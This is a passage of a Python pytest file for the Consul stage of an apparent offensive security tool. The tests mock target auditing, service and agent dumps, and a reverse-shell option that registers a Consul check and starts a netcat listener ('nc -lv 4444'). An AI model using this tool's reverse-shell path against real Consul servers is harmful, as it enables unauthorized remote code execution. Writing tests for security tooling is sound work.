    assert any(expected_message in msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "error")


def test_run_consul_stage_warns_for_token_override_and_unreachable_targets(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(consul, "collect_scan_targets", lambda *_args, **_kwargs: ["127.0.0.1"])
    captured: list[dict[str, object]] = []

    def fake_audit_targets(**kwargs):  # type: ignore[no-untyped-def]
        captured.append(kwargs)
        return 1, 0, 1, False

    monkeypatch.setattr(consul, "audit_consul_targets", fake_audit_targets)
    rc = consul.run_consul_stage(
        _consul_args(token="root", username="alice", password="secret"),
        logger=object(),  # type: ignore[arg-type]
    )
    assert rc == 0
    assert captured and captured[0]["username"] is None and captured[0]["password"] is None
    warnings = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "warn"]
    assert any("--token is set; Basic auth credentials are ignored" in msg for msg in warnings)
    assert any("all consul targets are unreachable" in msg for msg in warnings)


def test_run_consul_stage_listener_path_starts_local_listener(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(consul, "collect_scan_targets", lambda *_args, **_kwargs: ["127.0.0.1"])
    monkeypatch.setattr(consul, "audit_consul_targets", lambda **_kwargs: (1, 1, 0, True))

    class _FakePopen:
        def wait(self) -> int:
            return 0

    monkeypatch.setattr(consul.subprocess, "Popen", _FakePopen)
    monkeypatch.setattr(
        consul,
        "_start_local_nc_listener",
        lambda _port: {"started": True, "cmd": "nc -lv 4444", "pid": 1234, "process": _FakePopen()},
    )

    rc = consul.run_consul_stage(
        _consul_args(revshell=True, revshell_listen=True, revshell_host="127.0.0.1", revshell_port=4444),
        logger=object(),  # type: ignore[arg-type]
    )
    assert rc == 0
    infos = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "info"]
    assert any("local listener started" in msg for msg in infos)


def test_run_consul_stage_dump_flag_inference_and_listener_warnings(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [8500, 18500])
    monkeypatch.setattr(consul, "collect_scan_targets", lambda *_args, **_kwargs: ["127.0.0.1"])
    captured: list[dict[str, object]] = []

    def fake_audit_targets(**kwargs):  # type: ignore[no-untyped-def]
        captured.append(kwargs)
        return 1, 1, 0, False

    monkeypatch.setattr(consul, "audit_consul_targets", fake_audit_targets)
    rc = consul.run_consul_stage(
        _consul_args(
            debug=True,
            dump=True,
            service_dump_name="web",
            agent_name="node-1",
            node_name="node-1",
            revshell=True,
            revshell_listen=True,
            revshell_host="127.0.0.1",
            revshell_port=4444,
            revshell_check_id="id:rp-check",
            targets=None,
            hosts_file="targets.txt",
        ),
        logger=object(),  # type: ignore[arg-type]
    )
    assert rc == 0
    assert len(captured) == 2
    assert captured[0]["service_dump_name"] == "web"
    assert captured[0]["show_services"] is True
    assert captured[0]["show_agents"] is True
    assert captured[0]["show_nodes"] is True
    assert captured[0]["show_checks"] is True
    assert captured[0]["check_dump_id"] == "rp-check"
    warnings = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "warn"]
    assert any("--listen starts one local listener for all selected targets/ports" in msg for msg in warnings)
    assert any("local listener not started: revshell check was not registered" in msg for msg in warnings)


def test_run_consul_stage_returns_error_when_target_audit_raises(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(consul, "collect_scan_targets", lambda *_args, **_kwargs: ["127.0.0.1"])
    monkeypatch.setattr(consul, "audit_consul_targets", lambda **_kwargs: (_ for _ in ()).throw(OSError("broken pipe")))
    rc = consul.run_consul_stage(_consul_args(), logger=object())  # type: ignore[arg-type]
    assert rc == 2
    assert any(
        "failed to process consul output: broken pipe" in msg
        for level, msg in _ConsoleCapture.instances[-1].messages
        if level == "error"
    )
